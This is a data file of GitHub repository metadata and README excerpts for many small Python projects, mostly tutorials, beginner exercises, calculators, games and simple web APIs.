417725925;python-fastapi-example;https://github.com/ioanvapi/python-fastapi-example;Python;2021-10-16T05:22:10Z;0;0;0;"Python FastAPI example Simple web app written in Python. It uses FastAPI to create endpoints and is running using uvicorn.  FastAPI uvicorn  Prerequisites I guess it's better to write every python app in its own virtual environment. Most of these libraries requires Python 3.6+. $ sudo apt install python3.8-venv $ pip install --user virtualenv  # creates venv folder and its binary content $ python -m venv venv  # activate venv $ source venv/bin/activate  # or (in dev) install manually each library $ pip install -r requirements.txt  $ pip install fastapi uvicorn Required libraries  FastAPI (pip install fastapi) uvicorn   Start the server Start the server in reload mode. Each change in main.py file will be reloaded.  main - comes from main.py app - name of fastapi variable declared in main.py  $ uvicorn main:app --reload  # It should display  # Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit) Code Update .gitignore with venv before commit. Add code to handle GET requests Code below creates several endpoints, all for GET method request:  / - handled by index() function /task/{taskId} - handled by getTask(taskId: int) that receives the path param from request. Test it with http://localhost:8000/task/25 /item/{itemId} - handled by getItem(itemId: int, qp: Optional[str] = None) that receives both path param and query param. Test it with http://localhost:8000/item/12?qp=blue  Note: FastAPI provides usefull endpoints (swagger) to test this endpoints. You can use any of:  http://localhost:8000/docs http://localhost:8000/redoc  @app.get(""/"") def index():     return {""Hello"", ""World""}   @app.get(""/task/{taskId}"") def getTask(taskId: int):     return {""taskId"": taskId}   @app.get(""/item/{itemId}"") def getItem(itemId: int, qp: Optional[str] = None):     return {""taskId"": itemId, ""qp"": qp} Add code to handle POST and PUT requests It uses pydantic for data validation, settings management and enforces type hints, user friedly error. class Item(BaseModel):     name: str     price: float     isOffer: Optional[bool] = None # it is not required in a POST/PUT  # creates a new item @app.post(""/item"") def newItem(item: Item):     return {""item"": item, ""message"": ""New item created.""}  # updates an item @app.put(""/item/{itemId}"") def updateItem(itemId: int, item: Item):     return {""itemName"": item.name, ""itemPrice"": item.price, ""itemId"": itemId} Enable CORS FastAPI manages CORS by integrating a middleware. from fastapi.middleware.cors import CORSMiddleware  origins = [     ""http://localhost.com"",     ""https://localhost.com"",     ""http://localhost"",     ""http://localhost:8080"", ]  # The middleware will handle OPTIONS request with Origin and Access-Control-Request-Method headers # but will pass the requests through as normal otherwise. app.add_middleware(     CORSMiddleware,     allow_origins=origins,     allow_credentials=True,     allow_methods=[""*""],     allow_headers=[""*""], ) Dockerize Here is the way FastAPI recommend dockerizing the app. "
417753136;python_penataan_multiresponse_ikutan;https://github.com/falasyir/python_penataan_multiresponse_ikutan;Jupyter Notebook;2021-10-16T07:27:09Z;0;0;0;"Python Penataan Data Multirespon Ikutan Pembuatan dokumen ini dilakukan dibuat pada OS Fedora 34 menggunakan package:  jupyterlab==3.1.13 python==3.9.7 pandas==1.3.3 numpy==1.21.2  Note : data yang digunakan sebagai contoh adalah data fiktif Ketentuan penggunaan multirespon_ikutan.py  User setidaknya harus menentukan kolom yang akan digunakan sebagain acuan penataan / reassign dan kolom mana saja yang akna mengikuti pola penataan pada kolom acuan. Modul program ini belum dapat dengan baik menangani kolom multirespon dan kolom lainnya dengan jawaban yang masih memiliki nilai seperti ""99, Jepara"", ""99, tidak tahu"", atau ""99, ..."" lainnya (asumsi penggunaan modul program ini ketika data sudah clean). Modul program ini dapat menangani reassign value kolom jawaban yang pola penempatan jawabannya mengikuti/mengacu pada kolom multirespon tertentu (perbaikan ketentuan poin 5 pada reassign_into_spss.py)  "
417720980;python-api-challenge;https://github.com/kirsteenlugtu/python-api-challenge;;2021-10-16T04:58:28Z;0;0;0;python-api-challenge This is HW 6 for Northwestern Bootcamp. This covers the usage of APIs. 
417695091;platzi-curso-basico-python;https://github.com/FMGordillo/platzi-curso-basico-python;Python;2021-10-16T02:40:00Z;0;0;0;
417732289;List-in-Python-;https://github.com/HrutvikKakade8248/List-in-Python-;;2021-10-16T05:52:33Z;0;0;0;List-in-Python- This is a file containing all data and functions related to list 
417732689;python_form_validation;https://github.com/MayMyatKhine/python_form_validation;Python;2021-10-16T05:55:13Z;0;0;0;python_form_validation 
417714618;doge-wallstreet-backend;https://github.com/Ohana-Hackatudo/doge-wallstreet-backend;;2021-10-16T04:25:25Z;0;0;0;doge-wallstreet-backend Backend python 
417689014;python-for-android-image-classification-;https://github.com/LiSir000/python-for-android-image-classification-;;2021-10-16T02:06:16Z;0;0;0;
417688036;Python-Design-Patterns-parte1;https://github.com/silviosnjr/Python-Design-Patterns-parte1;Python;2021-10-16T02:00:55Z;0;0;0;
417746164;qr-code-generator-eel-python;https://github.com/ditodmm/qr-code-generator-eel-python;Python;2021-10-16T06:56:47Z;0;0;0;qr-code-generator-eel-python 
417758483;Project-1-Python-Coding-Exercises;https://github.com/Nsdam/Project-1-Python-Coding-Exercises;Jupyter Notebook;2021-10-16T07:53:11Z;0;0;0;Project-1-Python-Coding-Exercises Project 1: Python Coding Exercises 
417713782;Visulazation-with-python-airline-data;https://github.com/bappi11/Visulazation-with-python-airline-data;Python;2021-10-16T04:20:11Z;0;0;0;Visulazation-with-python-airline-data 
417674000;Machine-Learning-Linear-Classifier-Python;https://github.com/dpfru11/Machine-Learning-Linear-Classifier-Python;Python;2021-10-16T00:33:23Z;0;0;0;
417727532;Assignment-no-03-python-1;https://github.com/RENUKAWANKHEDE/Assignment-no-03-python-1;Jupyter Notebook;2021-10-16T05:29:57Z;0;0;0;
417676049;100_days_of_code_python;https://github.com/MatheusNascimentoS/100_days_of_code_python;Python;2021-10-16T00:46:44Z;0;0;0;100_days_of_code_python Curso de Python da Udemy. 
417744455;python_lesson_13_UltraLite;https://github.com/vv31415926/python_lesson_13_UltraLite;HTML;2021-10-16T06:49:27Z;0;0;0;python_lesson_13_UltraLite 
417721143;Student-DataBase-Stored-Python-;https://github.com/harshitsingh20/Student-DataBase-Stored-Python-;;2021-10-16T04:59:14Z;1;1;0;Student-DataBase-Stored-Python- Abot the Project It is a Mobile App buils in Python using kivy🔥 python libary. To store the student database example like Name, Class, Rollno, Marks, etc. About Kivy Libary Kivy - Open source Python library for rapid development of applications that make use of innovative user interfaces, such as multi-touch apps. 
417694946;Tabelas-em-PDF-Usando-Python;https://github.com/fersoftware/Tabelas-em-PDF-Usando-Python;Jupyter Notebook;2021-10-16T02:39:18Z;0;0;0;Tabelas-em-PDF-Usando-Python Como Ler Tabelas em PDF Usando o Python [Extrair Tabelas de um Arquivo PDF]  pip install tabula-py import tabula  
417681299;TodoListAPIinPythonFlask;https://github.com/erneslobo/TodoListAPIinPythonFlask;Python;2021-10-16T01:19:35Z;0;0;0;"Todo List API in Python Flask  This is an interactive tutorial that will teach you how to create an API using the Python Flask framework using Python and Pipenv. 🌱  How to start this project This project comes with the necessary files to start working, but you have two options to start: a) Open this link in your browser to clone it with gitpod: https://gitpod.io#https://github.com/breatheco-de/python-flask-api-tutorial b) You can clone this repository on your local computer: $ git clone https://github.com/breatheco-de/python-flask-api-tutorial 💡 Important: Remember to create a new repository, update the remote (git remote set-url origin <your new url>), and upload the code to your new repository using add, commit and push. About the project we are going to build In this tutorial we are going to be building a REST API that exposes 3 endpoints to the internet: GET /todos POST /todos DELETE /todos/<int:position>  GET /todos Will return the list of all todos like this: [     {         ""done"": true,         ""label"": ""Sample Todo 1""     },     {         ""done"": true,         ""label"": ""Sample Todo 2""     } ] POST /todos It's going to add a new todo to the list, it will receive the following request body: {     ""done"": true,     ""label"": ""Sample Todo 1"" } And return the updated list of todos DELETE /todos/int:position It's going to remove one todo based on a given position at the end of the url, and return the updated list of todos. "
417691497;CS540-Regression;https://github.com/bwang338/CS540-Regression;Jupyter Notebook;2021-10-16T02:20:49Z;0;0;0;CS540-Regression Regression Python Program 
417685638;BasiCal;https://github.com/MagnusAleksandar/BasiCal;Python;2021-10-16T01:46:22Z;0;0;0;BasiCal Just a basic calculator in Python I made to learn the language 
417751394;stopwatch;https://github.com/sameekshaaamalani/stopwatch;;2021-10-16T07:19:17Z;0;0;0;"stopwatch #StopWatch Project in python. import time print(""press the ENTER key to start "") print(""press the CTRL+c to exit timer"") while True: try: input() start = time.time() print(""Started"") except KeyboardInterrupt: print(""Stopped"") end = time.time() print(""Total Time: "",round(end-start,2),""Seconds"") break "
417744280;banana;https://github.com/Sychanarry/banana;Python;2021-10-16T06:48:43Z;0;0;0;banana demo python program 
417697411;Algo;https://github.com/Adheer/Algo;Python;2021-10-16T02:52:23Z;0;0;0;Algo Algo implementations using Python 
417686720;GA_Project-1;https://github.com/wneizhan/GA_Project-1;;2021-10-16T01:53:07Z;0;0;0;
417719329;myFirstProject;https://github.com/DeanzaTutorial99/myFirstProject;;2021-10-16T04:48:58Z;0;0;0;myFirstProject 
417742762;banana;https://github.com/boyyou0010/banana;Python;2021-10-16T06:41:50Z;0;0;0;banana demo python program 
417728029;web-gis;https://github.com/tahadavari/web-gis;HTML;2021-10-16T05:31:39Z;1;1;0;web-gis web-gis with python 
417738360;Snake_Ladder;https://github.com/DeepR19/Snake_Ladder;Python;2021-10-16T06:21:57Z;0;0;0;
417757554;Elementary-Algorithm;https://github.com/WrtTZ/Elementary-Algorithm;;2021-10-16T07:48:16Z;0;0;0;Elementary-Algorithm Introductory algorithm in Python 
417758604;bancodadospython;https://github.com/machadosilvaalexandre/bancodadospython;;2021-10-16T07:53:48Z;0;0;0;bancodadospython Banco de Dados Python 
417746945;cocps;https://github.com/SB-9838/cocps;Python;2021-10-16T07:00:13Z;2;2;0;cocps Clash of Clans v6.253 private server written in python how2play  download server files download Patched APK run Main.py and play  Authors  Patched client by S.B#9838 OwnHomeData by XeonDev#1710 RC4 decrypt and ecncrypt stuff are by Ultracore Team  
417727022;Automate-the-Boring-Stuff-with-Python;https://github.com/6xur/Automate-the-Boring-Stuff-with-Python;Python;2021-10-16T05:27:43Z;0;0;0;
417720421;3D-Mpping-Software-in-python;https://github.com/george536/3D-Mpping-Software-in-python;Python;2021-10-16T04:55:38Z;0;0;0;
417736381;Most-Advance-Python-Course-for-Professionals-2021-;https://github.com/Ethel-yueying-sun/Most-Advance-Python-Course-for-Professionals-2021-;Python;2021-10-16T06:13:02Z;0;0;0;Most-Advance-Python-Course-for-Professionals-2021- Been larning from video made by Extern Code 👈🏻 
417718762;calculator-in-python-dMlb2w;https://github.com/tryspidy/calculator-in-python-dMlb2w;Python;2021-10-16T04:45:56Z;0;0;0;
417705946;python-file-exists-13aMj1;https://github.com/tryspidy/python-file-exists-13aMj1;;2021-10-16T03:39:45Z;0;0;0;
417671688;search_algorithms_maze_gui_with_python;https://github.com/enriquelpzcapistran/search_algorithms_maze_gui_with_python;Python;2021-10-16T00:17:06Z;0;0;0;Search_algorithms_maze_gui_with_python Running the .py File  Clone the repository Install dependencies by entering pip install - r requirements.txt And pip install numpy Run the .py file  Files  main.py: python file for application  
417750003;Jpg-to-png-convertor-via-python;https://github.com/PositiveMatician/Jpg-to-png-convertor-via-python;;2021-10-16T07:13:06Z;0;0;0;
417670828;My-First-ever-written-Python-Codes;https://github.com/The-Malik-of-Codes/My-First-ever-written-Python-Codes;Jupyter Notebook;2021-10-16T00:11:56Z;0;0;0;My-First-ever-written-Python-Codes 
417755308;mrsun101-python-gunicorn-mysql-fw;https://github.com/mrsun101/mrsun101-python-gunicorn-mysql-fw;;2021-10-16T07:37:16Z;0;0;0;
417679882;python-machine-learning-and-data-science;https://github.com/GordonSSu/python-machine-learning-and-data-science;;2021-10-16T01:10:14Z;0;0;0;
417755797;mrsun101-python-gunicorn-mysql-fw;https://github.com/ShpigunAV/mrsun101-python-gunicorn-mysql-fw;Python;2021-10-16T07:39:32Z;0;0;0;mrsun101-python-gunicorn-mysql-fw 
417705128;pysh;https://github.com/JianweiChen/pysh;;2021-10-16T03:34:50Z;0;0;0;pysh a shell to browse python 
417727607;Edureka-Data-Science;https://github.com/ManishKr19/Edureka-Data-Science;;2021-10-16T05:30:15Z;0;0;0;Edureka-Data-Science Edureka Data Science for Python 
417726453;calcfiananzas;https://github.com/JosDuran/calcfiananzas;HTML;2021-10-16T05:24:39Z;1;1;0;Calculadora financiera Calculadora de factores financieros basicos, puede calcular tanto factores como expresiones algebraicas en funcion de dichos factores. Funciones A/F(tasa: real, n: entero o real)  --> A/F dada una tasa y el numero de periodos ejemplo: A/F(0.08, 10) F/A(tasa: real, n: entero o real)  --> F/A dada una tasa y el numero de periodos ejemplo: F/A(0.08, 10) A/P(tasa: real, n: entero o real)  --> A/P dada una tasa y el numero de periodos ejemplo: A/P(0.08, 10) P/A(tasa: real, n: entero o real)  --> P/A dada una tasa y el numero de periodos ejemplo: P/A(0.08, 10) P/G(tasa: real, n: entero o real)  --> P/G dada una tasa y el numero de periodos ejemplo: P/G(0.08, 10) A/G(tasa: real, n: entero o real)  --> A/G dada una tasa y el numero de periodos ejemplo: A/G(0.08, 10) utilize solo mayusculas Deployment git clone https://github.com/JosDuran/calcfiananzas.git python3 -m venv unentor source unentor/bin/activate pip3 install -r requirements.txt flask run  Screenshoot  
417698306;my-third-test-app;https://github.com/avdeshmchandara/my-third-test-app;Shell;2021-10-16T02:57:03Z;0;0;0;##Getting Started/Run the project Please read instructions on macos_setup.md to get started and run the  project 
417737238;BMI-Calculator;https://github.com/YasiruLak/BMI-Calculator;Python;2021-10-16T06:16:49Z;0;0;0;
417688737;plathanus;https://github.com/leandrodesouzadev/plathanus;CSS;2021-10-16T02:04:34Z;0;0;0;"Plathanus Python Test This project aims to set up an interview with the Tabas Project. The challenge is to make an application that can save properties registers. In the register model we need an name and for each property we need at least 3 and a maximum of 5 photos. This photos should be stored locally. About the Backend Architecture It uses an the DDD design pattern, being: domain, Infrastructure, services and presentation layers. Each layer has its own responsability and dependecies specified as follows:  Domain - Does not depend on anybody, the main business rule of the application; Infrastructure - Any communication, storage, database that its outside of the application; Services - The use case of the application; Presentation - Data transformation and API / FrontEnd layers.  About the Technology It uses python 3.9.1. For the presentation layer we are using:  FastAPI for the API / FrontEnd server-side HTML render with Jinja Templates. For the Infrastructure layer we are using: PostgreSQL for the Database SQLAlchemy as the ORM; Local Storage for saving the image files.  The infrastructure layer has factories in case the Database, Storage or ORM type changes. Running the project On an terminal: python -m pip install requirements.txt And then: cd backend Lastly: uvicorn presentation.http.app:app "
417708482;binary-equivalent;https://github.com/mohitttttttttt/binary-equivalent;;2021-10-16T03:53:11Z;0;0;0;binary-equivalent python code for binary equivalent 
417737879;-R-you-ready-for-python-gentle-introduction-to-reticulate-package-;https://github.com/binmishr/-R-you-ready-for-python-gentle-introduction-to-reticulate-package-;;2021-10-16T06:19:38Z;0;0;0;"-R-you-ready-for-python-gentle-introduction-to-reticulate-package The details of the codeset and plots are included in the attached Microsoft Word Document (.docx) file in this repository. You need to view the file in ""Read Mode"" to see the contents properly after downloading the same. "
417741496;Fundamentals-of-Accelerated-Computing-with-CUDA-Python---NVIDIA;https://github.com/hanifizzudinrahman/Fundamentals-of-Accelerated-Computing-with-CUDA-Python---NVIDIA;Jupyter Notebook;2021-10-16T06:36:11Z;0;0;0;Fundamentals-of-Accelerated-Computing-with-CUDA-Python---NVIDIA Thanks to my beloved friends: Harsh Walia https://www.kaggle.com/harshwalia/code 
417700879;Databases-and-SQL-for-Data-Science-with-Python;https://github.com/vajay8679/Databases-and-SQL-for-Data-Science-with-Python;;2021-10-16T03:10:48Z;0;0;0;Databases-and-SQL-for-Data-Science-with-Python Lab-1(SELECT) https://labs.cognitiveclass.ai/tools/datasette/?datasette_path=%2F-%2Fadd-datasets%2F%3Fpath%3D%2Fresources%2Fdatasette%2Fcoursera%2FDB0201EN%2Flab1%2FSanFranciscoFilmLocations.sqlite&md_instructions_url=https%3A%2F%2Fcf-courses-data.s3.us.cloud-object-storage.appdomain.cloud%2FIBMDeveloperSkillsNetwork-DB0201EN-SkillsNetwork%2Flabs%2FLabs_Coursera_V5%2Flabs%2FLab%2520-%2520Basics%2520of%2520SQL%2520SELECT%2520Statement%2Finstructional-labs.md&lti=true Lab-2(COUNT,DISTINCT,LIMIT) https://labs.cognitiveclass.ai/tools/datasette/?datasette_path=%2F-%2Fadd-datasets%2F%3Fpath%3D%2Fresources%2Fdatasette%2Fcoursera%2FDB0201EN%2Flab2%2FSanFranciscoFilmLocations.sqlite&md_instructions_url=https%3A%2F%2Fcf-courses-data.s3.us.cloud-object-storage.appdomain.cloud%2FIBMDeveloperSkillsNetwork-DB0201EN-SkillsNetwork%2Flabs%2FLabs_Coursera_V5%2Flabs%2FLab%2520-%2520COUNT%2520-%2520DISTINCT%2520-%2520LIMIT%2Finstructional-labs.md&lti=true Lab-3(INSERT,UPDATE,DELETE) https://labs.cognitiveclass.ai/tools/datasette/?datasette_path=%2F-%2Fadd-datasets%2F%3Fpath%3D%2Fresources%2Fdatasette%2Fcoursera%2FDB0201EN%2Flab3%2FInstructors.db&md_instructions_url=https%3A%2F%2Fcf-courses-data.s3.us.cloud-object-storage.appdomain.cloud%2FIBMDeveloperSkillsNetwork-DB0201EN-SkillsNetwork%2Flabs%2FLabs_Coursera_V5%2Flabs%2FLab%2520-%2520INSERT%2520-%2520UPDATE%2520-%2520DELETE%2Finstructional-labs.md&lti=true 
417702266;python-check-if-file-exists-hC9wnI;https://github.com/tryspidy/python-check-if-file-exists-hC9wnI;Python;2021-10-16T03:18:16Z;0;0;0;
417677807;Ciclo1-PYthon---Retos-UPB-Mision-tic-2022;https://github.com/Calebsenm/Ciclo1-PYthon---Retos-UPB-Mision-tic-2022;Python;2021-10-16T00:58:05Z;0;0;0;
417745845;-Student-Marks-Based-Grade-Calculator-In-Python-Programming-Language;https://github.com/sameekshaaamalani/-Student-Marks-Based-Grade-Calculator-In-Python-Programming-Language;;2021-10-16T06:55:20Z;0;0;0;"-Student-Marks-Based-Grade-Calculator-In-Python-Programming-Language ee = input(""Enter Subject:"") em = float(input(""Enter Marks:"")) print() me = input(""Enter Subject:"") mm = float(input(""Enter Marks:"")) print() se = input(""Enter Subject:"") sm = float(input(""Enter Marks:"")) print() def grade(marks, sub): if float(marks) >= 90: print(sub + ""\nA+"") elif 80<= float(marks) <90: print(sub + ""\nB+"") elif 70<= float(marks) <80: print(sub + ""\nC+"") elif 60<= float(marks) <70: print(sub + ""\nD+"") elif 60 > float(marks): print(""Sorry Better Luck Next Time"") grade(em, ee) grade(mm, me) grade(sm, se) Average = ((float(em) + float(mm) + float(sm)) / 3) print(""Your Total Average:"",Average) if float(Average) >= 90: print(""Average Grade: \nA+"") elif 80 <= float(Average) < 90: print(""Average Grade: \nB+"") elif 70 <= float(Average) < 80: print(""Average Grade: \nC+"") elif 60 <= float(Average) < 70: print(""Average Grade: \nD+"") elif 60 > float(Average): print(""Sorry You Failed The Semester"") "
417706064;WJRE-PrintingFullName;https://github.com/wjrelumba/WJRE-PrintingFullName;Python;2021-10-16T03:40:28Z;0;0;0;
417756600;Remindme;https://github.com/awesomelewis2007/Remindme;Python;2021-10-16T07:43:43Z;0;0;0;Remindme A reminder app made in python Usage run main.py to show your reminders run main.py -new to make a new reminder run main.py -del to delete a reminder 
417731541;hello;https://github.com/appy4micky/hello;;2021-10-16T05:48:02Z;0;0;0;
417691801;Hello;https://github.com/Ng175/Hello;HTML;2021-10-16T02:22:09Z;0;0;0;Hello Hello 
417716939;social-media-website;https://github.com/srejus/social-media-website;HTML;2021-10-16T04:36:22Z;1;1;0;social-media-website This is a social media website with Django backend and HTML CSS JS frontend. for more about the packages used i also requirements.txt file. Key features of the Website ->user can follow other people. ->News feed is load based on the time which the post is created. 
417692184;BookDate;https://github.com/ourSherlock/BookDate;Python;2021-10-16T02:24:04Z;0;0;0;
417756251;hello;https://github.com/thierno-education/hello;HTML;2021-10-16T07:42:00Z;0;0;0;
417755694;Linear-Regression-Test-1;https://github.com/tathagatasengupta2000/Linear-Regression-Test-1;Jupyter Notebook;2021-10-16T07:39:03Z;0;0;0;
417713623;Hello;https://github.com/BitMaxCoin25/Hello;;2021-10-16T04:19:16Z;0;0;0;
417756038;hello;https://github.com/Corona-Suck/hello;HTML;2021-10-16T07:40:55Z;0;0;0;
417691861;EstruturaDeRepeticao;https://github.com/MatheusCarvalho-dev/EstruturaDeRepeticao;Python;2021-10-16T02:22:32Z;0;0;0;EstruturaDeRepeticao https://wiki.python.org.br/EstruturaDeRepeticao 
417707905;Simple-tkinter-window;https://github.com/DoneWithWork/Simple-tkinter-window;Python;2021-10-16T03:50:40Z;0;0;0;Simple-tkinter-window Making a simple tkinter window in Python  
417683965;social_lama_guanicoe;https://github.com/AmaliaPerezM/social_lama_guanicoe;Python;2021-10-16T01:36:10Z;0;0;0;
417758715;ROS2-Basics;https://github.com/bilalhm/ROS2-Basics;Python;2021-10-16T07:54:22Z;0;0;0;ROS2-Basics Writing a Simple Publisher and Subscriber (Python) 
417730272;discord-bot;https://github.com/syn4/discord-bot;Python;2021-10-16T05:42:01Z;2;2;0;Discord Bot A simple python discord bot with commands for moderation, utility and fun. Moderation  $kick <user> <reason> - Kick a user from the server $ban <user> <reason> - Ban a user from the server $unban <user> - Unban a user from the server $mute <user> -  Mute a user $unmute <user> - Unmute a user $nick <user> <nickname> - Change a users nickname $clear <amount> - Clear recent messages from chat  Information  $whois <user> -  Display information about a user $av <user> - Display a users avatar $serverinfo - Display information about the server $users - Display the number of users in the server  Fun & Misc  $echo <text> - Make the bot say someting (admin only) $8ball <question> - Ask the bot a question $rps <choice> - Play a game of rock paper scissors $calculate <equasion> - Calculate an equasion $coinflip - Flip a coin (heads or tails)  Bot-Related  $help - Display all commands and what they do $uptime - The amount of time since last restart $ping - The bots latency / response time $source - Get a link to the bots source code  
417747609;Word-Guessing-Game;https://github.com/sameekshaaamalani/Word-Guessing-Game;;2021-10-16T07:02:41Z;0;0;0;"Word-Guessing-Game #Word Guessing Game - It's a beginner project in python import random library that we use in order to choose on random words from a list of words name = input(""What is your name? "") Here the user is asked to enter the name first print(""Good Luck ! "", name) words = ['rainbow', 'computer', 'science', 'programming', 'python', 'mathematics', 'player', 'condition', 'reverse', 'water', 'board', 'geeks'] Function will choose one random word from this list of words word = random.choice(words) print(""Guess the characters"") guesses = '' any number of turns can be used here turns = 12 while turns > 0: # counts the number of times a user fails  failed = 0  # all characters from the input  # word taking one at a time.  for char in word:           # comparing that character with      # the character in guesses      if char in guesses:          print(char)               else:          print(""_"")                   # for every failure 1 will be          # incremented in failure          failed += 1           if failed == 0:      # user will win the game if failure is 0      # and 'You Win' will be given as output      print(""You Win"")           # this print the correct word      print(""The word is: "", word)      break  # if user has input the wrong alphabet then  # it will ask user to enter another alphabet  guess = input(""guess a character:"")   # every input character will be stored in guesses  guesses += guess   # check input with the character in word  if guess not in word:           turns -= 1          # if the character doesn’t match the word      # then “Wrong” will be given as output      print(""Wrong"")           # this will print the number of      # turns left for the user      print(""You have"", + turns, 'more guesses')                if turns == 0:          print(""You Loose"")   "
417676512;madlibs;https://github.com/dhruv53/madlibs;;2021-10-16T00:49:56Z;0;0;0;MadLibs The dynamic story teller!  An electron, python based application for generating dynamic stories Different story every day!  Ghost Stories Romantic Stories Fictional Stories  Features  Genre Selection Story Selection Export story as an image/pdf  Technology Stack MadLibs uses a number of programming languages to work properly:  Python Electron.js  Installation MadLibs requires Node.js v10+ to run. Install the dependencies and devDependencies and start the server. cd  npm i node app For production environments... npm install --production NODE_ENV=production node app Plugins Dillinger is currently extended with the following plugins. Instructions on how to use them in your own application are linked below.    Plugin README     Dropbox plugins/dropbox/README.md   GitHub plugins/github/README.md   Google Drive plugins/googledrive/README.md   OneDrive plugins/onedrive/README.md   Medium plugins/medium/README.md   Google Analytics plugins/googleanalytics/README.md    Building for source For production release: gulp build --prod Generating pre-built zip archives for distribution: gulp build dist --prod Verify the deployment by navigating to your server address in your preferred browser. 127.0.0.1:8000 License MIT Free Software, Hell Yeah! 
417681764;Bulk-email;https://github.com/shinigamijoy/Bulk-email;;2021-10-16T01:22:14Z;0;0;0;Bulk-email python code for bulk email sender with attachment 
417719648;Hacking-Github-Graph;https://github.com/legendlife/Hacking-Github-Graph;Python;2021-10-16T04:51:06Z;1;1;0;Hacking-Github-Graph Hacking github graph with a easy python script Requirements   git latest version installed.   A text editor (eg: vs code, sublime text) recommended: vs code.   latest version of windows/any os installed.   python latest version installed.   License & copyright: Copyright (c) 2021 SENPAI LEGEND Lisensed under The MIT License   Any changes or what so ever's are allowed to do!   Note that this is for educational purpose only!   What can it do?   Make your github graph juicy   Flex with your friends lol 😂    
417720681;smalltime;https://github.com/nicklambourne/smalltime;Python;2021-10-16T04:56:53Z;0;0;0;"smalltime    What is it? Requirements smalltime requires Python >= 3.6.2. See pyproject.toml for dependencies and dev dependencies. Installation Via poetry: poetry add smalltime Via pip: pip install smalltime Basic Usage In Python Code In-Line import smalltime  timer = smalltime.Timer(name=""hello world timer"") timer.start() print(""Hello, "", end="""") print(""World!"") timer.stop() Via Decorator import smalltime import subprocess  @smalltime.timed(name=""thing_timer"") def thing_you_want_to_time():     subprocess.call([""python"", ""-c"", ""\""import this\""""])   thing_you_want_to_time() From the Command Line N.B.: Assumes installation via Poetry and an active Poetry shell. # Usage: st <program> [args] st sleep 10 Starting counter (BNM8rBqP) Counter stopped (BNM8rBqP): 10007777130ns elapsed "
417720278;Assignment1-FullName;https://github.com/SiegfredLorelle/Assignment1-FullName;Python;2021-10-16T04:54:55Z;0;0;0;
417749576;Playing-With-Graphs-Using-Matplotlip-Library-.;https://github.com/sameekshaaamalani/Playing-With-Graphs-Using-Matplotlip-Library-.;;2021-10-16T07:10:54Z;0;0;0;Playing-With-Graphs-Using-Matplotlip-Library-. #Playing With Graphs (Using Matplotlip Library) -Python Intermediate Project from mpl_toolkits import mplot3d import numpy as np import matplotlib.pyplot as plt fig = plt.figure() ax = plt.axes(projection='3d') 
417681903;imagiipy;https://github.com/ImajinDevon/imagiipy;Python;2021-10-16T01:23:07Z;0;0;0;
417718464;Hog;https://github.com/JohnnyTeutonic/Hog;Python;2021-10-16T04:44:21Z;0;0;0;"Hog Minimal example of a Hog Descriptor written in Python 3. Installation Instructions python3 setup.py install  Importing the module files: import numpy as np from hog_example import hogImg  Example usage: with default paramaters: hog = hogImg(arr=np.random.randint(1, 101, size=(19,19))) output = hog.do_work()""""""  You can specify 'ppc' and 'cpc' in the constructor: hog = hogImg(arr=hog_example.np.random.randint(1,101,size=(19,19)), ppc=(3,3), cpc=(5,5))  "
417713617;DSECLPFDS;https://github.com/ElisonSherton/DSECLPFDS;Jupyter Notebook;2021-10-16T04:19:14Z;0;0;0;DSECLPFDS  BITS-Pilani MTech's Python for Data Science Exercises  & Assignments In this repo, I have collated all the exercises, assignments and books offered in the introductory course offered by BITS as a part of the MTech for Data Science Course. 
417717031;ExceptionTree;https://github.com/BenEgeIzmirli/ExceptionTree;;2021-10-16T04:36:50Z;0;0;0;
417731166;Object_detection;https://github.com/hari227/Object_detection;Python;2021-10-16T05:46:27Z;0;0;0;Object_detection Project On Object Detection Using YOLO In Python 
417685617;Among-Us-Character;https://github.com/Sean4478/Among-Us-Character;;2021-10-16T01:46:14Z;0;0;0;
417700027;lox-py;https://github.com/jmptc/lox-py;;2021-10-16T03:06:08Z;0;0;0;lox-py Python implementation of the lox language from Crafting Interpreters 
417682644;conways;https://github.com/amamoon/conways;;2021-10-16T01:27:53Z;0;0;0;conways A simulation of Conways Game of Life in Python built using np, matplotlib and mpl.animation to make a simple version of Conways Game of Life What is Conways Game of Life https://en.wikipedia.org/wiki/Conway%27s_Game_of_Life Tech Stack Pure python and some libraries TODO  Add a proper GUI instead of using mpl Add some cleaner animations move online  
417711386;caldav-to-ics-server;https://github.com/lyh543/caldav-to-ics-server;Python;2021-10-16T04:07:19Z;0;0;0;"caldav-to-ics-server Convert CalDAV to ics file. You can deploy on your server so that Google Calendar can subscribe it. Usage  install Python 3 requirements.  pip install -r requirements.txt  Fill in config.json with your CalDAV URL, username and password.  {   ""url"": ""http://caldav.example.com"",   ""username"": ""username"",   ""password"": ""password"" }  Run  python3 main.py  Open http://localhost:45000/caldav.ics in your browser.  License MIT "
417743687;PyCalculator;https://github.com/Rishi-Ahuja/PyCalculator;Python;2021-10-16T06:46:08Z;0;0;0;PyCalculator A simple calculator made using Python on the TKinter window. 
417687328;OrganizeDesktopFiles;https://github.com/pri-1/OrganizeDesktopFiles;Python;2021-10-16T01:56:45Z;0;0;0;OrganizeDesktopFiles 
417720087;Iteru;https://github.com/MuhammedM294/Iteru;Jupyter Notebook;2021-10-16T04:53:50Z;0;0;0;Iteru  Python package for a web app  Free software: MIT license Documentation: https://MuhammedM294.github.io/iteru  Features  TODO  Credits This package was created with Cookiecutter and the giswqs/pypackage project template. 
417698983;Full-Name;https://github.com/JPalijado/Full-Name;Python;2021-10-16T03:00:42Z;0;0;0;Full-Name This is a python program that displays my full name. 
417698554;LUKS_wipe;https://github.com/danon360/LUKS_wipe;Python;2021-10-16T02:58:20Z;0;0;0;LUKS_wipe Python script that quickly and irreversibly wipes a LUKS encrypted partition. Run as superuser. 
417741663;NOT-NOT;https://github.com/Rizu20/NOT-NOT;Python;2021-10-16T06:37:02Z;0;0;0;"NOT-NOT Python version of android popular game NOT NOT I was playing this android game ""NOT NOT"" and the logic seemed simple enough. So tried this python version. You have to press Keyboard arrow keys shown in prompt before timeout (3 seconds) Main challenge was keeping track of input and timeout in parallel but this solution worked for me - https://stackoverflow.com/a/41812246/13506777 Screenshot - https://imgur.com/a/zAEYWrG "
417725386;SAGE-Telegram-Bot;https://github.com/WhiteFang033/SAGE-Telegram-Bot;Python;2021-10-16T05:18:39Z;0;0;0;SAGE Now available on telegram! 😄 
417735544;Authenticator;https://github.com/MatheusAssisM/Authenticator;;2021-10-16T06:09:09Z;0;0;0;
417690208;sal-mak_soloproj;https://github.com/salmak84/sal-mak_soloproj;Python;2021-10-16T02:13:59Z;1;1;0;
